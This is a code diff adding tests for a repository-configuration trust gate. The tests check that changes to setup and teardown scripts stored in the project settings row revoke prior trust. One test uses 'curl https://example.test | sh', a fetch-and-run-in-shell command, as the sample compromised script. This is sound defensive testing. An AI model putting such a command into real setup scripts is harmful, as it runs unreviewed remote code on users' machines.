@@ -65,6 +65,46 @@ describe('repo config trust', () => {
     expect(await repoConfigTrustReview(testDb.db, 'task1')).toMatchObject({ trusted: true, current: null })
   })
 
+  // The project row is untrusted input too, since the premise the gate started on — checkout untrusted,
+  // database trusted — only holds while nothing but the owner can write the row. Changing a script
+  // through the settings UI has to move the hash, or a compromised write would run unseen.
+  it('hashes the project row\'s script columns and invalidates trust when one changes', async () => {
+    writeFileSync(join(repo, '.acorn', 'config.toml'), '[scripts.run.dev]\ncommand = "pnpm dev"\n')
+    const setScript = (value: string | null) => testDb.db.update(schema.projects).set({ setupScript: value })
+
+    await setScript('pnpm install')
+    const first = (await repoConfigTrustReview(testDb.db, 'task1')).current!
+    expect(first.files.map((file) => file.path)).toEqual(['.acorn/config.toml', '(project settings)'])
+    expect(first.text).toContain('setupScript = pnpm install')
+    await acknowledgeRepoConfig(testDb.db, 'task1', first.hash)
+    await expect(assertRepoConfigTrusted(testDb.db, 'task1')).resolves.toBeUndefined()
+
+    await setScript('curl https://example.test | sh')
+    const changed = await repoConfigTrustReview(testDb.db, 'task1')
+    expect(changed.trusted).toBe(false)
+    expect(changed.current?.text).toContain('curl https://example.test | sh')
+    expect(changed.previous?.text).toContain('setupScript = pnpm install')
+  })
+
+  // A project whose only executable configuration is on the row still has a snapshot: without one there
+  // would be nothing for the owner to acknowledge and nothing to notice a change against.
+  it('snapshots a project row even when the checkout has no .acorn files', async () => {
+    await testDb.db.update(schema.projects).set({ teardownScript: 'docker compose down' })
+    const review = await repoConfigTrustReview(testDb.db, 'task1')
+    expect(review.trusted).toBe(false)
+    expect(review.current?.files.map((file) => file.path)).toEqual(['(project settings)'])
+    expect(review.current?.text).toContain('teardownScript = docker compose down')
+  })
+
+  // Unset and empty must hash the same, or trimming a trailing space in the settings form would revoke
+  // trust for no change in what runs.
+  it('ignores blank script columns', async () => {
+    writeFileSync(join(repo, '.acorn', 'config.toml'), '[scripts.run.dev]\ncommand = "pnpm dev"\n')
+    const blank = (await repoConfigTrustReview(testDb.db, 'task1')).current!
+    await testDb.db.update(schema.projects).set({ setupScript: '   ', devScript: '' })
+    expect((await repoConfigTrustReview(testDb.db, 'task1')).current!.hash).toBe(blank.hash)
+  })
+
   it('does not treat an unresolved migration row as project trust', async () => {
     const config = join(repo, '.acorn', 'config.toml')
     writeFileSync(config, '[scripts.run.dev]\ncommand = "pnpm dev"\n')
